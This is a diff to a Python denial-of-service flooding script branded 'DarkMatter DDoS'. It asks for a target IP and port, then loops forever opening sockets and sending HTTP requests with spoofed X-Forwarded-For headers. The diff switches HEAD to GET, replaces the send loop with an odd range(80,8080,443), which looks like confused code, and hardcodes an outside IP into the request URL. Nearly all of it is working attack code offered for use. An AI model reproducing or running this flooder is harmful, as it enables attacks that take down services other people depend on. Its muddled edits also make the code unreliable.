@@ -55,14 +55,14 @@ def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"
   forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD " + url + " HTTP/2.0\r\nHost: " + ip + "\r\n"
+  get_host = "GET " + url + " HTTP/2.0\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
     try:
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
       #Attack starts here
-      for y in range(80):
+      for y in range(80,8080,443):
           atk.send(str.encode(request))
     except socket.error:
       sleep(0)
@@ -72,7 +72,7 @@ def attack():
 print("Bienvenido a DarkMatter DDoS\n")
 ip = input("IP/Domain: ")
 port = int(input("Port: "))
-url = f"http://{str(ip)}"
+url = f"http://50.7.198.146/{str(ip)}"
 print("[>>>] RS-28 Sarmat [<<<]")
 sleep(1)
 
